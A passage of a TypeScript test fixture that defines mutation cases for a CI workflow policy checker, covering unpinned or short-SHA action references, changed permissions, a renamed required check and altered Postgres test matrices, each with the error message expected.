      "  push:\n    branches: [main]\n",
      "  push:\n    branches: [main]\n    paths-ignore: ['docs/**']\n",
    ),
    "documents.yml: push must not use paths-ignore",
  );
  add(
    "unpinned-uses",
    "documents.yml",
    swap(
      "uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
      "uses: actions/checkout@v4",
    ),
    "must pin a full commit SHA",
  );
  add(
    "short-sha-uses",
    "release.yml",
    swap(
      "uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
      "uses: actions/checkout@11d5960",
    ),
    "must pin a full commit SHA",
  );
  add(
    "local-uses",
    "install.yml",
    swap(
      "uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
      "uses: ./.github/actions/checkout",
    ),
    "must pin a full commit SHA",
  );
  add(
    "top-permissions-widened",
    "web.yml",
    swap(
      "permissions:\n  contents: read\n",
      "permissions:\n  contents: read\n  pull-requests: read\n",
    ),
    "web.yml: top-level permissions changed from the pinned value",
  );
  add(
    "release-verify-permission-dropped",
    "release.yml",
    swap("      contents: read\n      checks: read\n", "      contents: read\n"),
    "release.yml: verify permissions changed from the pinned value",
  );
  add(
    "required-check-renamed",
    "documents.yml",
    swap("  documents-ci-gate:\n", "  documents-gate:\n"),
    "documents.yml: required check documents-ci-gate missing",
  );
  const flow =
    '[{"runner":"ubuntu-26.04","pg_major":"18","shard":"a","tests":"--test db_integration"}]';
  for (const [name, line] of [
    ["static-include", `      matrix: {"include": ${flow}, "exclude": []}\n`],
    ["plain-static-include", `      matrix: {"include": ${flow}}\n`],
    ["exclude-output", "      matrix: ${{ fromJSON(needs.ci-plan.outputs.postgres_exclude) }}\n"],
    [
      "array-fallback",
      "      matrix: ${{ fromJSON(needs.ci-plan.outputs.postgres_matrix || '[]') }}\n",
    ],
  ] as const) {
    add(
      `postgres-matrix-${name}`,
      "rust.yml",
      swap(POSTGRES_MATRIX_LINE, line),
      "rust: postgres strategy must be exactly",
    );
  }
  return cases;
}

export const MUTATION_CASES: readonly MutationCase[] = caseList();
